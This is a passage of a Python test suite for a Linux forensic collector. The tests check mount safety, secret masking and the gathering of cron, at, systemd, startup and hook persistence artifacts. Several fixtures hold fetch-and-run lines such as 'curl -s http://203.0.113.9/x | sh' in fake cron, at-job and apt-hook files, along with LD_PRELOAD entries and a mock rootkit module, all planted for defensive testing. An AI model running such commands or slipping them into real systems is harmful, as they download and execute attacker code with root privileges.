            (MOUNTINFO + "60 22 0:60 / /usr/lib64/security/remote rw - nfs4 f:/x rw\n").encode(),
        )
        self.write("usr/lib64/security/pam_unix.so", b"\x7fELF")
        self.write("usr/lib64/security/remote/pam_x.so", b"\x7fELF")
        records = collect(self.root, ["pam"])
        files = {f["path"]: f for f in records_named(records, "module_file")}
        self.assertEqual(
            files["/usr/lib64/security/remote"],
            {"path": "/usr/lib64/security/remote", "not_examined": "network_filesystem"},
        )
        self.assertNotIn("/usr/lib64/security/remote/pam_x.so", files)
        self.assertIn("sha256", files["/usr/lib64/security/pam_unix.so"])

    def test_direct_automount_points_are_never_touched(self):
        self.write(
            "proc/self/mountinfo",
            (MOUNTINFO + "61 22 0:61 / /srv/homes rw - autofs map rw,fd=5,direct\n").encode(),
        )
        collector = load_collector(self.root)
        self.assertEqual(collector.mount_risk("/srv/homes"), "automount")
        self.assertIsNone(collector.mount_risk("/home"))  # indirect: listing is safe

    def test_glob_limit_never_returns_partial_matches(self):
        self.write("etc/inc/stray.conf", b"PermitRootLogin yes\n")
        self.write("etc/inc/a/sshd.conf", b"\n")
        collector = load_collector(self.root)
        skipped = []
        # Budgets that run out at each step of the expansion, including just
        # after /etc/inc/a (a prefix, not a match) has been found.
        for budget in range(1, 8):
            collector.MAX_GLOB_ENTRIES = budget
            found = collector.glob_absolute("/etc/inc/*/sshd.conf", skipped)
            self.assertIn(found, ([], ["/etc/inc/a/sshd.conf"]), budget)
        self.assertEqual(skipped[-1]["reason"], "limit")

    def test_glob_expansion_is_bounded(self):
        for index in range(30):
            self.write(f"etc/ssh/sshd_config.d/{index:02}.conf", b"\n")
        collector = load_collector(self.root)
        collector.MAX_GLOB_ENTRIES = 10
        skipped = []
        found = collector.glob_absolute("/etc/ssh/sshd_config.d/*.conf", skipped)
        self.assertEqual(found, [])  # cut short: fail closed
        self.assertIn({"path": "/etc/ssh/sshd_config.d/*.conf", "reason": "limit"}, skipped)

    def gaps(self, records):
        return {(g["path"], g["reason"]) for g in records_named(records, "not_examined")}

    def test_linked_parent_onto_a_network_drive_is_not_probed(self):
        # A passwd home /srv/alice that is a link onto NFS: its history and
        # .ssh must not be looked at through the link.
        self.write(
            "etc/passwd",
            b"root:x:0:0:root:/root:/bin/bash\nalice:x:1002:1002::/srv/alice/home:/bin/bash\n",
        )
        self.write("mnt/team/alice/home/.bash_history", b"x\n")
        os.makedirs(Path(self.root, "srv"))
        os.symlink("../mnt/team/alice", Path(self.root, "srv/alice"))
        records = collect(self.root, ["accounts"])
        history = [h for h in records_named(records, "shell_history") if "alice" in h["path"]]
        self.assertEqual(history, [])
        homes = records_named(records, "homes")[0]
        self.assertIn(
            ("/srv/alice/home", "network_filesystem"),
            {(n["path"], n["reason"]) for n in homes["not_examined"]},
        )

    def test_include_globs_never_look_inside_automounted_folders(self):
        self.write("etc/ssh/sshd_config", b"Include /home/*/sshd.conf\n")
        self.write("home/alice/sshd.conf", b"PermitRootLogin yes\n")
        records = collect(self.root, ["ssh"])
        self.assertEqual(sorted(sources(records)), ["/etc/ssh/sshd_config"])

    def test_refused_link_is_not_probed_afterwards(self):
        os.makedirs(Path(self.root, "etc"), exist_ok=True)
        os.symlink("../home/alice", Path(self.root, "etc/sudo-links"))
        self.write("home/alice/rules", b"alice ALL=(ALL) NOPASSWD: ALL\n")
        self.write("etc/sudoers", b"#include /etc/sudo-links/rules\n")
        records = collect(self.root, ["sudoers"])
        self.assertEqual(sorted(sources(records)), ["/etc/sudoers"])
        self.assertIn(("/etc/sudo-links/rules", "automount"), self.gaps(records))
        self.assertEqual(records_named(records, "config_link"), [])

    def test_included_directory_on_an_automount_is_not_listed(self):
        self.write("home/alice/sudoers.d/x", b"alice ALL=(ALL) ALL\n")
        self.write("etc/sudoers", b"@includedir /home/alice/sudoers.d\n")
        records = collect(self.root, ["sudoers"])
        self.assertIn(("/home/alice/sudoers.d", "automount"), self.gaps(records))
        self.assertEqual(records_named(records, "include_dir"), [])

    def test_unattributed_keys_on_a_network_drive_are_not_read(self):
        self.write("etc/ssh/sshd_config", b"AuthorizedKeysFile /mnt/team/keys/%u\n")
        self.write("mnt/team/keys/bob", self.key)
        records = collect(self.root, ["ssh"])
        self.assertEqual(records_named(records, "authorized_key"), [])
        self.assertIn(("/mnt/team", "network_filesystem"), self.gaps(records))

    def test_linked_pam_directory_on_an_automount_is_not_listed(self):
        self.write("home/alice/pam.d/sshd", b"auth required pam_unix.so\n")
        os.makedirs(Path(self.root, "etc"), exist_ok=True)
        os.symlink("../home/alice/pam.d", Path(self.root, "etc/pam.d"))
        records = collect(self.root, ["pam"])
        self.assertEqual(sources(records), {})
        self.assertIn(("/etc/pam.d", "automount"), self.gaps(records))

    def test_links_into_risky_mounts_are_not_followed(self):
        self.write("home/alice/x.conf", b"auth required pam_unix.so\n")
        os.makedirs(Path(self.root, "etc/pam.d"))
        os.symlink("../../home/alice/x.conf", Path(self.root, "etc/pam.d/alice"))
        records = collect(self.root, ["pam"])
        self.assertEqual(sources(records), {})
        (gap,) = records_named(records, "not_examined")
        self.assertEqual((gap["path"], gap["reason"]), ("/etc/pam.d/alice", "automount"))


# --- Canary test: no planted secret may leave the server, through any module ----------

AT_JOB = (
    b"#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\n"
    b"HOSTNAME=web01; export HOSTNAME\n"
    b'MY_TOKEN=a\\ b\\$c"\n"line2; export MY_TOKEN\n'
    b"PATH=/usr/bin:/bin; export PATH\n"
    b"cd /tmp || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n"
    b"curl -s http://203.0.113.9/x | sh\n"
)


class AtJobTests(unittest.TestCase):
    def setUp(self):
        self.collector = load_collector("/nonexistent")

    def test_environment_is_replaced_by_its_names(self):
        out = self.collector.at_job_without_environment(AT_JOB)
        self.assertEqual(
            out,
            b"#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\n"
            b"# [collector: 4 environment lines withheld; variables: HOSTNAME MY_TOKEN PATH]\n"
            b"cd /tmp || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n"
            b"curl -s http://203.0.113.9/x | sh\n",
        )

    def test_value_cannot_end_the_environment_early(self):
        # at escapes spaces, so a value can't put "cd ... || {" on a line.
        job = AT_JOB.replace(
            b"PATH=/usr/bin:/bin",
            b'X="\n"cd\\ /tmp\\ \\|\\|\\ \\{"\n"CanaryAtValue',
        )
        out = self.collector.at_job_without_environment(job)
        self.assertNotIn(b"CanaryAtValue", out)
        self.assertIn(b"curl -s", out)

    def test_other_layouts_keep_only_their_leading_comments(self):
        for job in (
            b"#!/bin/sh\nSECRET=x; export SECRET\ncd /tmp || {\n",
            b"#!/bin/sh\numask 22\nSECRET=x; export SECRET\necho never a cd line\n",
            b"",
        ):
            out = self.collector.at_job_without_environment(job)
            self.assertNotIn(b"SECRET", out)
            self.assertTrue(out.endswith(b"the rest is withheld]\n"), out)


class PersistenceTests(FixtureRoot):
    def setUp(self):
        super().setUp()
        self.write(
            "etc/passwd",
            b"root:x:0:0:root:/root:/bin/bash\njch:x:1000:1000::/home/jch:/bin/bash\n",
        )

    def test_cron_system_files_user_crontabs_and_at_jobs(self):
        self.write("etc/crontab", b"17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
        self.write("etc/cron.d/backdoor", b"* * * * * root /usr/bin/curl -s http://x | sh\n")
        self.write("etc/cron.daily/logrotate", b"#!/bin/sh\n/usr/sbin/logrotate /etc/x\n")
        self.write("var/spool/cron/crontabs/jch", b"@reboot /home/jch/.x/run password=hunter2\n")
        self.write("var/spool/cron/atjobs/a0000101c80375", AT_JOB)
        self.write("var/spool/cron/atjobs/.SEQ", b"2\n")
        self.write("var/spool/cron/atspool/a0000101c80375", b"job output CanarySpool\n")
        self.write("var/spool/at/a0000201c80375", AT_JOB)  # the RHEL layout
        self.write("var/spool/at/spool/a0000201c80375", b"job output CanarySpool\n")
        records = collect(self.root, ["cron"])
        sent = sources(records)
        self.assertEqual(
            sorted(sent),
            [
                "/etc/cron.d/backdoor",
                "/etc/cron.daily/logrotate",
                "/etc/crontab",
                "/var/spool/at/a0000201c80375",
                "/var/spool/cron/atjobs/.SEQ",
                "/var/spool/cron/atjobs/a0000101c80375",
                "/var/spool/cron/crontabs/jch",
            ],
        )
        self.assertIn(b"password=[MASKED", sent["/var/spool/cron/crontabs/jch"][1])
        for name in ("/var/spool/at/a0000201c80375", "/var/spool/cron/atjobs/a0000101c80375"):
            self.assertNotIn(b"line2", sent[name][1])
            self.assertIn(b"variables: HOSTNAME MY_TOKEN PATH", sent[name][1])
            self.assertIn(b"curl -s http://203.0.113.9/x | sh", sent[name][1])
        files = {f["path"] for f in records_named(records, "file")}
        self.assertIn("/var/spool/cron/atspool/a0000101c80375", files)
        self.assertIn("/var/spool/at/spool/a0000201c80375", files)
        self.assertEqual(records[-1]["modules"]["cron"]["status"], "ok")

    def test_systemd_units_generators_linger_and_user_units(self):
        self.write("etc/systemd/system/evil.service", b"[Service]\nExecStart=/tmp/x\n")
        self.write("etc/systemd/system/evil.timer", b"[Timer]\nOnCalendar=minutely\n")
        os.makedirs(Path(self.root, "etc/systemd/system/timers.target.wants"))
        os.symlink(
            "/etc/systemd/system/evil.timer",
            Path(self.root, "etc/systemd/system/timers.target.wants/evil.timer"),
        )
        self.write("run/systemd/transient/run-u1.service", b"[Service]\nExecStart=/bin/sh\n")
        self.write("usr/lib/systemd/system/sshd.service", b"[Service]\nExecStart=/usr/sbin/sshd\n")
        os.makedirs(Path(self.root, "lib"))
        os.symlink("../usr/lib/systemd", Path(self.root, "lib/systemd"))
        self.write("usr/lib/systemd/system-generators/gen", b"\x7fELF\x00binary generator")
        self.write("etc/systemd/system.conf", b"[Manager]\nDefaultEnvironment=LD_PRELOAD=/x.so\n")
        self.write("var/lib/systemd/linger/jch", b"")
        unit = self.write(
            "home/jch/.config/systemd/user/miner.service", b"[Service]\nExecStart=/tmp/m\n"
        )
        records = collect(self.root, ["systemd"])
        sent = sources(records)
        self.assertEqual(
            sorted(sent),
            [
                "/etc/systemd/system.conf",
                "/etc/systemd/system/evil.service",
                "/etc/systemd/system/evil.timer",
                "/run/systemd/transient/run-u1.service",
                "/usr/lib/systemd/system/sshd.service",
            ],
        )
        files = {f["path"]: f for f in records_named(records, "file")}
        link = files["/etc/systemd/system/timers.target.wants/evil.timer"]
        self.assertEqual(link["link_target"], "/etc/systemd/system/evil.timer")
        self.assertIn("/var/lib/systemd/linger/jch", files)
        user_unit = files["/home/jch/.config/systemd/user/miner.service"]
        self.assertEqual(user_unit["sha256"], hashlib.sha256(unit.read_bytes()).hexdigest())
        self.assertEqual(user_unit["accounts"], ["jch"])
        self.assertIn("sha256", files["/usr/lib/systemd/system-generators/gen"])
        skipped = records_named(records, "content_skipped")
        self.assertEqual(
            skipped, [{"path": "/usr/lib/systemd/system-generators/gen", "reason": "binary"}]
        )
        # /lib/systemd is /usr/lib/systemd: walked once.
        tops = [s["top"] for s in records_named(records, "walk_summary")]
        self.assertEqual(tops.count("/usr/lib/systemd/system"), 1)
        self.assertNotIn("/lib/systemd/system", tops)

    def test_walked_hard_links_are_never_read_even_root_owned_under_usr(self):
        self.write("home/CORP/bob/.bash_history", b"CanaryWalkedHistory\n")
        os.makedirs(Path(self.root, "usr/lib/systemd/system"))
        os.link(
            Path(self.root, "home/CORP/bob/.bash_history"),
            Path(self.root, "usr/lib/systemd/system/x.service"),
        )
        collector = load_collector(self.root)
        # As if the history file were root's (su without "-" keeps HOME).
        collector.PACKAGE_OWNER_UID = os.getuid()
        out = io.BytesIO()
        collector.main(settings(["systemd"]), out=out)
        records = [json.loads(x) for x in gzip.decompress(out.getvalue()).splitlines()]
        self.assertEqual(sources(records), {})
        refused = records_named(records, "unreadable_file")
        self.assertEqual([r["path"] for r in refused], ["/usr/lib/systemd/system/x.service"])
        self.assertIn("hard-linked", refused[0]["reason"])

    def test_spool_reached_through_a_link_is_not_classified_as_crontabs(self):
        self.write("var/spool/at/a0000201c80375", AT_JOB)
        self.write("var/spool/at/spool/a0000201c80375", b"CanarySpoolOutput\n")
        Path(self.root, "var/spool").mkdir(parents=True, exist_ok=True)
        os.symlink("at", Path(self.root, "var/spool/cron"))
        records = collect(self.root, ["cron"])
        starts = [r["name"] for r in records if r["type"] == "source_start"]
        self.assertEqual(starts, ["/var/spool/at/a0000201c80375"])  # once, by at's walk
        job = sources(records)["/var/spool/at/a0000201c80375"][1]
        self.assertNotIn(b"line2", job)
        self.assertNotIn("CanarySpoolOutput", json.dumps(records))
        gaps = records_named(records, "not_examined")
        self.assertEqual([g["path"] for g in gaps], ["/var/spool/cron"])

    def test_every_link_to_a_sent_file_is_recorded(self):
        self.write("etc/rc.d/rc.local", b"#!/bin/sh\n")
        os.symlink("rc.d/rc.local", Path(self.root, "etc/rc.local"))
        os.symlink("rc.d/rc.local", Path(self.root, "etc/profile"))
        records = collect(self.root, ["startup"])
        links = {r["path"]: r for r in records_named(records, "config_link")}
        self.assertEqual(sorted(links), ["/etc/profile", "/etc/rc.local"])
        self.assertTrue(links["/etc/profile"]["already_sent"])
        starts = [r["name"] for r in records if r["type"] == "source_start"]
        self.assertEqual(starts.count("/etc/rc.d/rc.local"), 1)

    def test_control_drop_ins_and_runtime_generators(self):
        self.write(
            "etc/systemd/system.control/sshd.service.d/50-x.conf",
            b"[Service]\nExecStartPost=/tmp/x\n",
        )
        self.write("run/systemd/system-generators/gen", b"#!/bin/sh\n/tmp/y\n")
        self.write("run/systemd/user-generators/ugen", b"#!/bin/sh\n")
        self.write("home/jch/.config/systemd/user.control/a.service.d/x.conf", b"[Service]\n")
        records = collect(self.root, ["systemd"])
        sent = sources(records)
        self.assertIn("/etc/systemd/system.control/sshd.service.d/50-x.conf", sent)
        self.assertIn("/run/systemd/system-generators/gen", sent)
        self.assertIn("/run/systemd/user-generators/ugen", sent)
        files = {f["path"] for f in records_named(records, "file")}
        self.assertIn("/home/jch/.config/systemd/user.control/a.service.d/x.conf", files)

    def test_linked_home_startup_file_hashes_its_target(self):
        target = self.write("home/jch/.dotfiles/bashrc", b"export X=1\n")
        os.symlink(".dotfiles/bashrc", Path(self.root, "home/jch/.bashrc"))
        self.write("home/jch/.bash_history", b"ls\n")
        os.symlink(".bash_history", Path(self.root, "home/jch/.zshrc"))
        records = collect(self.root, ["startup"])
        home = {f["path"]: f for f in records_named(records, "home_startup_file")}
        bashrc = home["/home/jch/.bashrc"]
        self.assertEqual(bashrc["type"], "l")
        self.assertEqual(bashrc["resolved"], "/home/jch/.dotfiles/bashrc")
        self.assertEqual(bashrc["target_sha256"], hashlib.sha256(target.read_bytes()).hexdigest())
        self.assertNotIn("target_sha256", home["/home/jch/.zshrc"])
        self.assertIn("never read", home["/home/jch/.zshrc"]["hash_skipped"])
        self.assertEqual(sources(records), {})

    def test_linked_user_unit_directories_are_each_recorded(self):
        self.write(
            "etc/passwd",
            b"root:x:0:0:root:/root:/bin/bash\njch:x:1000:1000::/home/jch:/bin/bash\n"
            b"amy:x:1001:1001::/home/amy:/bin/bash\n",
        )
        self.write("srv/units/miner.service", b"[Service]\nExecStart=/tmp/m\n")
        for home in ("home/jch", "home/amy"):
            Path(self.root, home, ".config/systemd").mkdir(parents=True)
            os.symlink("/srv/units", Path(self.root, home, ".config/systemd/user"))
        records = collect(self.root, ["systemd"])
        links = {
            r["path"]: r
            for r in records_named(records, "config_link")
            if r["path"].endswith("/.config/systemd/user")
        }
        self.assertEqual(
            sorted(links), ["/home/amy/.config/systemd/user", "/home/jch/.config/systemd/user"]
        )
        self.assertEqual(links["/home/amy/.config/systemd/user"]["accounts"], ["amy"])
        self.assertEqual(links["/home/jch/.config/systemd/user"]["accounts"], ["jch"])
        self.assertEqual(sum(1 for r in links.values() if r.get("already_walked")), 1)
        self.assertNotIn("/srv/units/miner.service", sources(records))  # homes: no text

    def test_configuration_links_never_read_the_spools(self):
        self.write("var/spool/at/a0000201c80375", AT_JOB)
        self.write("var/spool/cron/crontabs/jch", b"@daily x\n")
        Path(self.root, "etc/cron.d").mkdir(parents=True)
        os.symlink("/var/spool/at/a0000201c80375", Path(self.root, "etc/cron.d/x"))
        Path(self.root, "etc/profile.d").mkdir(parents=True)
        os.symlink("/var/spool/cron/crontabs/jch", Path(self.root, "etc/profile.d/y.sh"))
        os.symlink("/var/spool/at/a0000201c80375", Path(self.root, "etc/rc.local"))
        records = collect(self.root, ["cron", "startup"])
        sent = sources(records)
        self.assertIn("/var/spool/at/a0000201c80375", sent)  # by cron's walk, rewritten
        self.assertNotIn(b"line2", sent["/var/spool/at/a0000201c80375"][1])
        refused = [r["path"] for r in records_named(records, "unreadable_file")]
        self.assertEqual(refused, ["/var/spool/at/a0000201c80375"])  # via /etc/rc.local
        starts = [r["name"] for r in records if r["type"] == "source_start"]
        self.assertEqual(starts.count("/var/spool/at/a0000201c80375"), 1)

    def test_startup_system_text_and_home_hashes(self):
        self.write("etc/ld.so.preload", b"/usr/lib/libhide.so\n")
        self.write("etc/rc.d/rc.local", b"#!/bin/sh\n/opt/x &\n")
        os.symlink("rc.d/rc.local", Path(self.root, "etc/rc.local"))
        self.write("etc/profile.d/zz.sh", b"export TOKEN=abc123\nalias ls='ls --hide=x'\n")
        self.write("etc/update-motd.d/00-header", b"#!/bin/sh\n/tmp/.x &\n")
        self.write("etc/environment", b'PATH="/usr/bin"\n')
        bashrc = self.write("home/jch/.bashrc", b"export OPENAI_KEY=CanaryHomeStartup\n")
        self.write("root/.ssh/rc", b"/tmp/.x &\n")
        self.write("home/jch/.config/autostart/x.desktop", b"[Desktop Entry]\nExec=/tmp/x\n")
        records = collect(self.root, ["startup"])
        sent = sources(records)
        self.assertEqual(
            sorted(sent),
            [
                "/etc/environment",
                "/etc/ld.so.preload",
                "/etc/profile.d/zz.sh",
                "/etc/rc.d/rc.local",
                "/etc/update-motd.d/00-header",
            ],
        )
        self.assertIn(b"TOKEN=[MASKED", sent["/etc/profile.d/zz.sh"][1])
        # Named directly, through /etc/rc.local and by the /etc/rc.d walk: sent once.
        starts = [r["name"] for r in records if r["type"] == "source_start"]
        self.assertEqual(starts.count("/etc/rc.d/rc.local"), 1)
        self.assertEqual(records_named(records, "config_link")[0]["resolved"], "/etc/rc.d/rc.local")
        home = {f["path"]: f for f in records_named(records, "home_startup_file")}
        self.assertEqual(sorted(home), ["/home/jch/.bashrc", "/root/.ssh/rc"])
        self.assertEqual(
            home["/home/jch/.bashrc"]["sha256"], hashlib.sha256(bashrc.read_bytes()).hexdigest()
        )
        files = {f["path"] for f in records_named(records, "file")}
        self.assertIn("/home/jch/.config/autostart/x.desktop", files)
        raw = json.dumps(records)
        self.assertNotIn("CanaryHomeStartup", raw)
        self.assertNotIn("Exec=/tmp/x", raw)

    def test_home_startup_file_linked_to_history_is_not_hashed(self):
        self.write("home/jch/.bash_history", b"ls\n")
        os.link(Path(self.root, "home/jch/.bash_history"), Path(self.root, "home/jch/.zshrc"))
        records = collect(self.root, ["startup"])
        home = {f["path"]: f for f in records_named(records, "home_startup_file")}
        self.assertNotIn("sha256", home["/home/jch/.zshrc"])
        self.assertIn("hash_skipped", home["/home/jch/.zshrc"])

    def test_hooks(self):
        self.write("etc/apt/apt.conf.d/99x", b'DPkg::Post-Invoke {"curl http://x | sh";};\n')
        self.write("etc/dnf/plugins/post-transaction-actions.d/x.action", b"*:any:/tmp/x\n")
        self.write("usr/lib/python3.12/site-packages/dnf-plugins/evil.py", b"import os\n")
        self.write("etc/udev/rules.d/99-x.rules", b'ACTION=="add", RUN+="/tmp/x"\n')
        records = collect(self.root, ["hooks"])
        self.assertEqual(
            sorted(sources(records)),
            [
                "/etc/apt/apt.conf.d/99x",
                "/etc/dnf/plugins/post-transaction-actions.d/x.action",
                "/etc/udev/rules.d/99-x.rules",
                "/usr/lib/python3.12/site-packages/dnf-plugins/evil.py",
            ],
        )

    def test_large_and_refused_files_are_described_not_sent(self):
        self.write("etc/cron.d/big", b"# x\n" * (70 * 1024))
        self.write("etc/shadow", b"root:*:1::::::\n")
        os.link(Path(self.root, "etc/shadow"), Path(self.root, "etc/cron.d/hard"))
        os.symlink("/home/jch/.bash_history", Path(self.root, "etc/cron.d/hist"))
        records = collect(self.root, ["cron"])
        self.assertEqual(sources(records), {})
        self.assertEqual(records_named(records, "content_skipped")[0]["path"], "/etc/cron.d/big")
        unreadable = [r["path"] for r in records_named(records, "unreadable_file")]
        self.assertEqual(unreadable, ["/etc/cron.d/hard"])
        files = {f["path"]: f for f in records_named(records, "file")}
        self.assertIn("hash_skipped", files["/etc/cron.d/hard"])
        self.assertEqual(files["/etc/cron.d/hist"]["link_target"], "/home/jch/.bash_history")


UTMP = struct.Struct("=hxxi32s4s32s256shhiii16s20s")  # glibc: signed seconds


def utmp(kind, user=b"", host=b"", line=b"", when=None, address=b"", pid=1):
    when = int(NOW if when is None else when)
    return UTMP.pack(
        kind, pid, line, b"", user, host, 0, 0, 0, when, 0, address.ljust(16, b"\0"), b""
    )


class SystemJournalTests(FixtureRoot):
    def test_system_journal_asks_for_kernel_systemd_and_logind(self):
        self.write("usr/bin/journalctl", FAKE_JOURNALCTL).chmod(0o755)
        records = collect(self.root, ["system_journal"], days=1)
        ((start, content, _),) = sources(records).values()
        argv = start["meta"]["argv"]
        self.assertEqual(
            argv[-7:],
            [
                "_TRANSPORT=kernel",
                "+",
                "_PID=1",
                "+",
                "SYSLOG_IDENTIFIER=systemd-logind",
                "SYSLOG_IDENTIFIER=systemd-coredump",
                "SYSLOG_IDENTIFIER=systemd-shutdown",
            ],
        )
        fields = [a for a in argv if a.startswith("--output-fields=")][0]
        self.assertIn("_BOOT_ID", fields)
        self.assertIn(b"[MASKED", content)  # the fake's -pS3cret line
        self.assertEqual(records[-1]["modules"]["system_journal"]["status"], "ok")

    def test_boot_list(self):
        self.write(
            "usr/bin/journalctl",
            b"#!/bin/sh\necho \"args $*\"\necho ' -1 abc Mon 2026-10-26 Tue 2026-10-27'\n",
        ).chmod(0o755)
        records = collect(self.root, ["boots"])
        ((start, content, _),) = sources(records).values()
        self.assertEqual(start["meta"]["argv"][1:], ["--list-boots", "--no-pager"])
        self.assertIn(b" -1 abc", content)


class LoginRecordTests(FixtureRoot):
    def test_records_in_the_window_masked_and_summarised(self):
        self.write(
            "var/log/wtmp",
            utmp(2, user=b"reboot", line=b"~", host=b"6.8.0")
            + utmp(
                7, user=b"jch", line=b"pts/0", host=b"203.0.113.5", address=bytes([203, 0, 113, 5])
            )
            + bytes(UTMP.size)  # a zeroed record, as cleaners leave
            + utmp(7, user=b"old", when=NOW - 90 * DAY)
            + utmp(8, line=b"pts/0", address=socket.inet_pton(socket.AF_INET6, "2001:db8::1"))
            + b"\x01\x02",  # a partial record at the end
        )
        self.write(
            "var/log/btmp",
            utmp(6, user=b"password=Hunter2x", host=b"https://u:pw123@x.example"),
        )
        records = collect(self.root, ["login_records"])
        login = records_named(records, "login_record")
        # btmp sorts first; in wtmp, the record before the window is left out.
        self.assertEqual(
            [r["type"] for r in login],
            ["login_process", "boot_time", "user_process", "dead_process"],
        )
        by_path = {}
        for r in login:
            by_path.setdefault(r["path"], []).append(r)
        jch = by_path["/var/log/wtmp"][1]
        self.assertEqual(
            (jch["user"], jch["line"], jch["address"]), ("jch", "pts/0", "203.0.113.5")
        )
        self.assertEqual(by_path["/var/log/wtmp"][2]["address"], "2001:db8::1")
        failed = by_path["/var/log/btmp"][0]
        self.assertNotIn("Hunter2x", json.dumps(records))
        self.assertNotIn("pw123", json.dumps(records))
        self.assertEqual(failed["user"], "[MASKED:unknown_user]")  # not a local account
        files = {f["path"]: f for f in records_named(records, "login_file")}
        wtmp = files["/var/log/wtmp"]
        self.assertEqual(
            (
                wtmp["records"],
                wtmp["blank"],
                wtmp["before_window"],
                wtmp["sent"],
                wtmp["partial_bytes"],
            ),
            (5, 1, 1, 3, 2),
        )
        self.assertEqual(sources(records), {})  # nothing of the files is sent raw
        self.assertEqual(records[-1]["modules"]["login_records"]["status"], "ok")

    def test_failed_logins_keep_only_local_account_names(self):
        self.write("etc/passwd", b"root:x:0:0::/root:/bin/bash\n")
        self.write(
            "var/log/btmp",
            utmp(6, user=b"root") + utmp(6, user=b"Summer2026!") + utmp(6, user=b""),
        )
        self.write("var/log/wtmp", utmp(7, user=b"someone"))  # a real login: kept
        records = collect(self.root, ["login_records"])
        users = [(r["path"], r["user"]) for r in records_named(records, "login_record")]
        self.assertEqual(
            users,
            [
                ("/var/log/btmp", "root"),
                ("/var/log/btmp", "[MASKED:unknown_user]"),
                ("/var/log/btmp", ""),
                ("/var/log/wtmp", "someone"),
            ],
        )
        btmp = [f for f in records_named(records, "login_file") if f["path"] == "/var/log/btmp"]
        self.assertEqual(btmp[0]["masked"], {"unknown_user": 1})

    def collect_as(self, layout):
        collector = load_collector(self.root)
        collector.utmp_layout = lambda: layout(collector)
        out = io.BytesIO()
        collector.main(settings(["login_records"]), out=out)
        return [json.loads(x) for x in gzip.decompress(out.getvalue()).splitlines()]

    def test_aarch64_records_are_400_bytes(self):
        # Built field by field, independently of the collector's layouts:
        # AArch64 glibc has a 64-bit session and 64-bit time fields.
        def record(kind, user, when):
            return b"".join(
                (
                    kind.to_bytes(2, "little") + b"\0\0",
                    (42).to_bytes(4, "little"),
                    b"pts/1".ljust(32, b"\0"),
                    b"ts/1",
                    user.ljust(32, b"\0"),
                    b"203.0.113.7".ljust(256, b"\0"),
                    b"\0" * 4,  # exit status
                    (7).to_bytes(8, "little"),  # session
                    int(when).to_bytes(8, "little"),  # seconds
                    (0).to_bytes(8, "little"),  # microseconds
                    bytes([203, 0, 113, 7]).ljust(16, b"\0"),
                    b"\0" * 20,
                    b"\0" * 4,  # padding to 8-byte alignment
                )
            )

        self.assertEqual(len(record(7, b"x", NOW)), 400)
        self.write("var/log/wtmp", record(7, b"jch", NOW) + record(8, b"", NOW))
        records = self.collect_as(lambda c: c.UTMP_LAYOUTS["aarch64"])
        login = records_named(records, "login_record")
        self.assertEqual(
            [(r["type"], r["user"], r["session"]) for r in login][0], ("user_process", "jch", 7)
        )
        self.assertEqual(login[0]["address"], "203.0.113.7")
        self.assertEqual(len(login), 2)
        summary = records_named(records, "login_file")[0]
        self.assertEqual((summary["record_size"], summary["partial_bytes"]), (400, 0))

    def test_damaged_times_are_counted_and_never_stop_collection(self):
        # Signed seconds: -1 is before 1970, never a login in 2106.
        self.write(
            "var/log/wtmp",
            utmp(7, user=b"neg", when=-1) + utmp(7, user=b"ok") + utmp(7, user=b"ok2"),
        )
        records = collect(self.root, ["login_records"])
        self.assertEqual([r["user"] for r in records_named(records, "login_record")], ["ok", "ok2"])
        summary = records_named(records, "login_file")[0]
        self.assertEqual(summary["bad_time"], 1)
        self.assertGreater(summary["first_time"], "2026")

    def test_out_of_range_aarch64_time_is_counted(self):
        big = struct.Struct("=hxxi32s4s32s256shhqqq16s20s4x")

        def record(user, when):
            return big.pack(7, 1, b"", b"", user, b"", 0, 0, 0, when, 0, b"", b"")

        self.write("var/log/wtmp", record(b"far", 253402300800) + record(b"now", int(NOW)))
        records = self.collect_as(lambda c: c.UTMP_LAYOUTS["aarch64"])
        self.assertEqual([r["user"] for r in records_named(records, "login_record")], ["now"])
        self.assertEqual(records_named(records, "login_file")[0]["bad_time"], 1)
        self.assertEqual(records[-1]["modules"]["login_records"]["status"], "ok")

    def test_unknown_architecture_is_reported_not_guessed(self):
        self.write("var/log/wtmp", utmp(7, user=b"jch"))
        records = self.collect_as(lambda c: None)
        self.assertEqual(records_named(records, "login_record"), [])
        self.assertFalse(records_named(records, "login_files")[0]["supported"])

    def test_rotations_compressed_and_refused(self):
        self.write("etc/passwd", b"b:x:1000:1000::/home/b:/bin/bash\n")
        self.write("var/log/wtmp.1", utmp(7, user=b"a"))
        self.write("var/log/btmp-20261001.gz", gzip.compress(utmp(6, user=b"b")))
        self.write("etc/shadow", b"root:*:1::::::\n")
        os.link(Path(self.root, "etc/shadow"), Path(self.root, "var/log/btmp"))
        records = collect(self.root, ["login_records"])
        users = sorted(r["user"] for r in records_named(records, "login_record"))
        self.assertIn("a", users)
        self.assertIn("b", users)
        refused = [r["path"] for r in records_named(records, "unreadable_file")]
        self.assertIn("/var/log/btmp", refused)

    def test_login_databases_are_described(self):
        self.write("var/log/wtmp", b"")
        self.write("var/lib/wtmpdb/wtmp.db", b"SQLite format 3\0")
        records = collect(self.root, ["login_records"])
        self.assertEqual(
            [r["path"] for r in records_named(records, "login_database")],
            ["/var/lib/wtmpdb/wtmp.db"],
        )


class CrashDumpTests(FixtureRoot):
    def test_listed_never_read_or_hashed(self):
        self.write("var/lib/systemd/coredump/core.sshd.0.abc.123.zst", b"CanaryCoreMemory")
        self.write("var/crash/_usr_sbin_nginx.0.crash", b"CanaryApportReport")
        records = collect(self.root, ["crash_dumps"])
        files = {f["path"]: f for f in records_named(records, "file")}
        self.assertIn("/var/lib/systemd/coredump/core.sshd.0.abc.123.zst", files)
        self.assertIn("/var/crash/_usr_sbin_nginx.0.crash", files)
        raw = json.dumps(records)
        self.assertNotIn("Canary", raw)
        self.assertNotIn("sha256", raw)


class KernelModuleTests(FixtureRoot):
    def test_modules_taint_and_policy(self):
        self.write(
            "proc/modules",
            b"rootkit 16384 0 - Live 0xffffffffc0a00000 (OE)\n"
            b"ext4 1000000 2 jbd2,mbcache, Live 0xffffffffc0b00000\n"
            b"garbage line\n"
            b"leaving 8192 -1 - Unloading 0xffffffffc0c00000 (OE-)\n"
            b"arriving 8192 0 - Loading 0xffffffffc0d00000 (+)\n",
        )
        self.write("sys/module/rootkit/taint", b"OE\n")
        self.write("sys/module/module/parameters/sig_enforce", b"N\n")
